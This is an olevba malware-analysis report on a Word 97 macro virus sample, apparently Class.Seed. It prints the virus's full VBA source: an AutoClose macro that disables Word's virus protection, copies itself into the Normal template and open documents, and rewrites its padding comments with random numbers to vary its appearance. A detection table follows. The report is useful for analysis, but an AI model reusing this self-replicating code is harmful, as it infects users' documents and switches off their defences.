olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s-a925f6cdb1c209fd12f6d92b1683a48edc8518e7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s-a925f6cdb1c209fd12f6d92b1683a48edc8518e7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'2279967001220831488165,03488505786522E+192279967001220831488162279967001
Randomize
'16668617449395313806256,58933460868936E+20166686174493953138062516668617449
s = 0: r = 0
'543542596591963498093,2175737648908E+1954354259659196349809543542596
On Error GoTo 87
'39421308304694053756012,73605070952194E+21394213083046940537560139421308304
Options.VirusProtection = False
'370939896046233510892,31225788150081E+193709398960462335108937093989604
Options.SaveNormalPrompt = False
'4730138176608012032412,87598092596989E+204730138176608012032414730138176
Options.ConfirmConversions = False
'3119222500648303259242,02220211304474E+203119222500648303259243119222500
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'266570929008672436012,31181932387875E+192665709290086724360126657092900
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3461571880917653442566,11086603667793E+1934615718809176534425634615718809
If xf > 90 And fx > 0 Then GoTo 87
'2454987585647126852011,15695836632958E+2024549875856471268520124549875856
If xf < 90 Then
'16506596484599138215299,88973275793595E+20165065964845991382152916506596484
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'3810839824661204653212,51974502426678E+203810839824661204653213810839824
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'53051908961111742763,24209460962375E+185305190896111174276530519089
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\Seed$.dll"
'20484479376818188816001,67601719270259E+21204844793768181888160020484479376
End If
'113744307673088820648,31343729699739E+18113744307673088820641137443076
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'442890250060682542012,68757062014444E+19442890250060682542014428902500
k = Int(Rnd(1) * 100) + 1
'109739812911695716011,28348568666893E+18109739812911695716011097398129
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'19197765136309247215,93685530654327E+17191977651363092472119197765136
l = Int(Rnd(1) * 75) + 1
'236461355297931545691,87550404340196E+192364613552979315456923646135529
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'2236101529615234189613,40651946891374E+1922361015296152341896122361015296
m = Int(Rnd(1) * 50) + 1
'27767223225686329964411,90574773277788E+21277672232256863299644127767223225
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'10740420496115089984001,23611482303791E+20107404204961150899840010740420496
n = Int(Rnd(1) * 25) + 1
'18097244676756475516811,36901225191141E+21180972446767564755168118097244676
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'33743118249603395008812,03604291331322E+21337431182496033950088133743118249
xs.codemodule.AddFromFile ("c:\Seed$.dll")
'9322674916773607470447,2120909595012E+209322674916773607470449322674916
With xs.codemodule
'24087660804590203294811,42166167707865E+21240876608045902032948124087660804
    For poly = 1 To 4
'44753402500700057513963,13299556954012E+21447534025007000575139644753402500
    .deletelines 1
'2044486656473950316169,68985096996101E+192044486656473950316162044486656
    Next poly
'1864317160025434874894,74186737198801E+1918643171600254348748918643171600
End With
'3168901849149692778014,74361721017836E+193168901849149692778013168901849
If xf < 90 Then
'7765839376593984635244,61278926908579E+207765839376593984635247765839376
    With xs.codemodule
'15240890116311374257644,74562084564231E+20152408901163113742576415240890116
    .replaceline 1, "Sub AutoClose()"
'14150767849197919878562,80071825420483E+20141507678491979198785614150767849
    .replaceline 93, "Sub ToolsMacro()"
'17985492100520036098499,35310514110672E+20179854921005200360984917985492100
    End With
'3270009856714466170252,33631141849607E+203270009856714466170253270009856
End If
'3959383632419252788847,62291770111494E+1939593836324192527888439593836324
With xs.codemodule
'11847887104175604902562,0805470604398E+20118478871041756049025611847887104
    For poly = 2 To 92 Step 2
'24985808761590630948411,47573919253003E+21249858087615906309484124985808761
    r = Int(Rnd(412835) * 203989) + 8485
'695039016130440599292,1157404180016E+19695039016130440599296950390161
    s = Int(Rnd(384958) * 285865) + 2988
'24822632704247536728896,1445133019861E+20248226327042475367288924822632704
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'9593223025414606971613,97741714637457E+209593223025414606971619593223025
Next poly
'289078275626333318567,61239032015028E+18289078275626333318562890782756
End With
'11883180100776207460259,22381304511434E+20118831801007762074602511883180100
87:
'8481857409723965123566,14056894712499E+208481857409723965123568481857409
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'11377848889156787962251,78390974209474E+20113778488891567879622511377848889
End Sub
'43664281600277908904361,21346926591225E+21436642816002779089043643664281600
Sub ToolsMacro()
'Word97/Class.Seed by Virus :)
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|Hex String| DHfVG9P1ai         |2044486656473950316169                       |
+----------+--------------------+---------------------------------------------+

